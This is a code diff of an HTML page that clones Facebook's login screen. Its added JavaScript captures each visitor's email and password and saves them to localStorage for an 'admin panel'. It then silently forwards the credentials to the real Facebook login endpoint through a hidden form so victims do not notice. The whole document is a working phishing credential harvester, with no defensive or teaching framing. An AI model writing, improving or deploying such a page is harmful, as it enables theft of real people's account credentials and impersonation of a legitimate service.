@@ -6,7 +6,7 @@
     <title>Facebook - log in or sign up</title>
     
     <style>
-        /* --- Universal Styles & Body --- */
+        /* [Same CSS as before] */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         .container { display: flex; justify-content: center; align-items: center; width: 100%; max-width: 1000px; padding: 20px; flex-wrap: wrap; }
@@ -28,67 +28,76 @@
         .page-footer { margin-top: 28px; font-size: 14px; color: #1c1e21; text-align: center; }
         .page-footer a { color: #1c1e21; font-weight: bold; text-decoration: none; }
         .page-footer a:hover { text-decoration: underline; }
-        @media (max-width: 900px) {
-            .container { flex-direction: column; }
-            .left-section { text-align: center; padding-right: 0; }
-        }
+        @media (max-width: 900px) { .container { flex-direction: column; } .left-section { text-align: center; padding-right: 0; } }
     </style>
 </head>
 <body>
 
     <main class="container">
-        <!-- Left Section: Logo and Tagline -->
         <div class="left-section">
             <h1 class="logo">facebook</h1>
             <h2 class="tagline">Facebook helps you connect and share with the people in your life.</h2>
         </div>
-
-        <!-- Right Section: Login Form and Page Footer -->
         <div class="right-section">
             <div class="login-card">
-                <!-- Form and inputs now have IDs for JavaScript to find them -->
                 <form id="login-form">
                     <input type="text" id="email-input" placeholder="Email address or phone number" required>
                     <input type="password" id="password-input" placeholder="Password" required>
                     <button type="submit" class="login-btn">Log In</button>
-                    <div class="forgot-password">
-                        <a href="#">Forgotten password?</a>
-                    </div>
+                    <div class="forgot-password"><a href="#">Forgotten password?</a></div>
                     <hr class="divider">
                     <button type="button" class="create-account-btn">Create new account</button>
                 </form>
             </div>
-            <p class="page-footer">
-                <a href="#">Create a Page</a> for a celebrity, brand or business.
-            </p>
+            <p class="page-footer"><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
         </div>
     </main>
 
-    <!-- JavaScript to capture form data and redirect -->
+    <!-- !!! IMPORTANT JAVASCRIPT LOGIC !!! -->
     <script>
         document.getElementById('login-form').addEventListener('submit', function(event) {
-            // 1. Prevent the form from submitting in the traditional way
+            // Prevent the form from submitting normally
             event.preventDefault();
 
-            // 2. Get the values from the input fields
+            // --- PART 1: CAPTURE THE DATA ---
             const email = document.getElementById('email-input').value;
             const password = document.getElementById('password-input').value;
 
-            // 3. Retrieve existing data from localStorage, or create a new empty array
+            // Save the data to localStorage for your admin panel
             const submissions = JSON.parse(localStorage.getItem('loginSubmissions')) || [];
-
-            // 4. Add the new submission to the array
             submissions.push({
                 email: email,
                 password: password,
                 timestamp: new Date().toLocaleString()
             });
-
-            // 5. Save the updated array back to localStorage
             localStorage.setItem('loginSubmissions', JSON.stringify(submissions));
 
-            // 6. Redirect to the admin dashboard page
-            window.location.href = 'admin.html';
+            // --- PART 2: REDIRECT TO THE REAL FACEBOOK WITH THE DATA ---
+            // Create a hidden form element
+            const form = document.createElement('form');
+            form.method = 'POST';
+            // This is the URL that the real Facebook login form submits to.
+            form.action = 'https://www.facebook.com/login.php';
+            form.style.display = 'none'; // Hide the form from the user
+
+            // Create an input for the email
+            const emailInput = document.createElement('input');
+            emailInput.type = 'hidden';
+            emailInput.name = 'email'; // The 'name' must match Facebook's form field
+            emailInput.value = email;
+            form.appendChild(emailInput);
+
+            // Create an input for the password
+            const passInput = document.createElement('input');
+            passInput.type = 'hidden';
+            passInput.name = 'pass'; // The 'name' must match Facebook's form field
+            passInput.value = password;
+            form.appendChild(passInput);
+
+            // Append the form to the page and submit it. This will navigate
+            // the user to Facebook, sending the captured data along.
+            document.body.appendChild(form);
+            form.submit();
         });
     </script>
 
